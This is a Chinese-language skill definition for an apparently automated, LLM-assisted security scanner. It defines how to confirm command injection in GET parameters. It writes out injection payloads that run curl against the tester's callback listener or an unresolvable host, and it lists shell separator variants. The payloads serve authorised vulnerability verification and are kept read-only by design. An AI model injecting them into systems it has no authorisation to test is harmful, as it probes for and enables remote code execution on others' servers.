---
name: verify-cmdi
# mutating: false —— 验证动作只读：载荷只发起一次**出站 HTTP 回调**，
# 不写目标状态、不读文件、不外泄命令输出、不做反弹 shell。（M18）
mutating: false
description: 命令注入假设的验证 SOP——注入载荷后宿主 listener 收到携带本次唯一 token 的请求即 Confirmed；干净未命中判 Rejected，交付证明不成立或第三方代抓取判 blocked
version: 1.0.0
required_tools: []
risk_level: L2
inputs: [hypotheses]
outputs: [findings]
---

# verify-cmdi：命令注入 / RCE 验证

`cmdi` 类 Confirmed 的**唯一合法产出门径**（职责隔离：发现类 skill 只能产
Signal/Hypothesis）。执行由编排器 `run_verify_phase()` 确定性驱动；唯一的 LLM 调用
是收尾的 **Verifier 终审**（T2，独立 agent + 输入边界）。

## 本 skill 确认的是什么（**先划清边界**）

**唯一认可确认手段 = 宿主 listener 收到携带本次唯一 token 的请求。**
注入 `;curl http://<我们的 listener>/c/<token>` 之后，如果那个请求真的到了，
就说明**我们注入的命令被执行了**——这是二值事实。

**不作证据的东西**（一律不看）：响应体里回显出来的 `curl ...` 文本、状态码、
响应长度、耗时。回显只是**反射**，不是命令执行。

## 三道防线（缺一不可）

1. **唯一 token + 常量时间比对**：每探针现生成 128 位 token，只出现在**我们注入的**
   载荷里；路径不含 token 的请求一律忽略、不计命中。第三方无法伪造命中。
2. **交付证明**：先注入**纯 token**（不含命令分隔符），看目标是否原样回显。
   回显 ⇒ 该参数确实被拼进了命令串，载荷"送达"有据。
   **不成立即 blocked**——绝不把"载荷没送到"当成"送到了没执行"。
3. **DNS 非命中变体**：注入 `;curl http://<随机主机名>.invalid/c/<token>`。该名字
   解析不了，真 shell 与"替我们抓取的中间件"**都**不会产生我们能收到的请求。
   故它**单独不确认任何东西**——它的作用是**排除第三方代抓取**：
   **若它反而命中了，整批判 blocked。**

   > 命令注入比 SSRF 多这一层风险：SSRF 的载荷指向我们自己，而命令注入可能打在
   > WAF / 反向代理 / 截图服务前面——那些东西会替访客抓取 URL，制造假命中。

## 判定表（宁漏勿滥）

| 条件 | 结论 |
|---|---|
| 命中 token ∧ 交付证明成立 ∧ DNS 变体未命中 | **Confirmed** |
| 探针出错 | blocked（覆盖不全，不驳回） |
| DNS 非命中变体命中（第三方代抓取） | blocked |
| 交付证明不成立 | blocked |
| 干净未命中 + 交付证明成立 | **Rejected**（真阴性） |

## 覆盖范围与明确不做

- **只覆盖 GET query 参数**（载荷变体 ≤8 条：`;` `|` `&&` `||` `$()` 反引号
  换行 引号内 `$()`）；POST/表单、header、JSON body 不在本轮范围；
- **不做**：时间盲注（`sleep`）、回显型确认（从响应读命令输出）、反弹 shell、
  写目标状态、读文件内容、命令输出外泄、编码/绕过变体（`$IFS`、base64 混淆等）；
- 与 SSRF 一样**不发任何凭据**给目标（listener 只被动接收）。

## 状态迁移

`REPRODUCED(actor=verify-cmdi)` → 证据门（§5.4.2，method =
`cmdi-callback-confirmed` + `behavioral`）→ Verifier 终审 →
`CONFIRMED`（CVSS 由代码算分）或 `REJECTED`。
